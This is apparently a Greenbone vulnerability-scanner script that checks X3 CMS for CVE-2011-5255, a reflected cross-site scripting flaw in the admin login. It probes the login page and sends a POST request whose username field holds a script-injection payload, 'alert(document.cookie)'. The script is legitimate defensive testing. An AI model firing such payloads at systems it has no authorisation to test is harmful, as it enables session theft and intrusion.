# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803403");
  script_version("2023-12-13T05:05:23+0000");
  script_cve_id("CVE-2011-5255");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2013-02-05 13:26:26 +0530 (Tue, 05 Feb 2013)");
  script_name("X3 CMS Multiple cross-site scripting (XSS) vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/46748");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51346");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72279");
  script_xref(name:"URL", value:"http://www.infoserve.de/system/files/advisories/INFOSERVE-ADV2011-04.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code in a users browser session in context of an affected site and
  launch other attacks.");

  script_tag(name:"affected", value:"X3CMS version 0.4.3.1-STABLE and prior");

  script_tag(name:"insight", value:"- Input passed via the URL to admin/login is not properly sanitised before
    being returned to the user.

  - Input passed via the 'username' and 'password' POST parameters to
    admin/login (when e.g. other POST parameters are not set) is not properly
    sanitised before being returned to the user.");

  script_tag(name:"solution", value:"Apply the patch from the referenced advisory.");

  script_tag(name:"summary", value:"x3cms is prone to multiple cross-site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_xref(name:"URL", value:"http://www.x3cms.net/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port)){
  exit(0);
}

host = http_host_name(port:port);

foreach dir (make_list_unique("/", "/x3cms", "/cms", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/admin/login.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  if(rcvRes && ('>User login | X3CMS<' >< rcvRes && ">X3 CMS<" >< rcvRes ))
  {
    postdata = "username=%27%22%3C%2Fscript%3E%3Cscript%3Ealert%28"+
               "document.cookie%29%3C%2Fscript%3E&password=&captcha"+
               "=&x4token=e14d2ab67683e7faa09983fb521e4835&nigolmrof=";

    req = string("POST ", dir, "/admin/login.php HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "^HTTP/1\.[01] 200" && "</script><script>alert(document.cookie)</script>" >< res)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
